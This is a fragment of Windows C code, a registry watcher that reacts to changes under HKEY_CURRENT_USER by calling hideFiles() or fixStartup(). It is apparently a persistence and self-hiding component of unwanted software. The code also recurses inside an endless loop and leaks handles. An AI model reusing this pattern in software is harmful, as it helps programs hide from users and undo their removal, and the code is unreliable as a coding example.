void WatchReg(char *watch, _Bool watchType)
{
	DWORD  dwFilter = 	REG_NOTIFY_CHANGE_NAME 			|
	                	REG_NOTIFY_CHANGE_ATTRIBUTES 	|
	                 	REG_NOTIFY_CHANGE_LAST_SET 		|
	                 	REG_NOTIFY_CHANGE_SECURITY; 

	HANDLE hEvent;
	HKEY   hMainKey;
	HKEY   hKey;
	LONG   lErrorCode;

	hMainKey = HKEY_CURRENT_USER;

	lErrorCode = RegOpenKeyEx(hMainKey, watch, 0, KEY_NOTIFY, &hKey);
	if (lErrorCode != ERROR_SUCCESS)
	{
		_tprintf(TEXT("Error in RegOpenKeyEx (%d).\n"), lErrorCode);
	  	return;
	}

	hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (hEvent == NULL)
	{
		_tprintf(TEXT("Error in CreateEvent (%d).\n"), GetLastError());
		return;
	}

	lErrorCode = RegNotifyChangeKeyValue(hKey, TRUE, dwFilter, hEvent, TRUE);
	if (lErrorCode != ERROR_SUCCESS)
	{
		_tprintf(TEXT("Error in RegNotifyChangeKeyValue (%d).\n"), lErrorCode);
		return;
	}

	while(1 > 0) {
		if (WaitForSingleObject(hEvent, INFINITE) == WAIT_FAILED)
		{
			_tprintf(TEXT("Error in WaitForSingleObject (%d).\n"), GetLastError());
			return;
		} 
		else 
		{
			if (watchType)
				hideFiles();
			else
				fixStartup();

			WatchReg(watch, watchType);
		}
	}

	lErrorCode = RegCloseKey(hKey);
	if (lErrorCode != ERROR_SUCCESS)
	{
		_tprintf(TEXT("Error in RegCloseKey (%d).\n"), GetLastError());
		return;
	}

	if (!CloseHandle(hEvent))
	{
		_tprintf(TEXT("Error in CloseHandle.\n"));
		return;
	}
}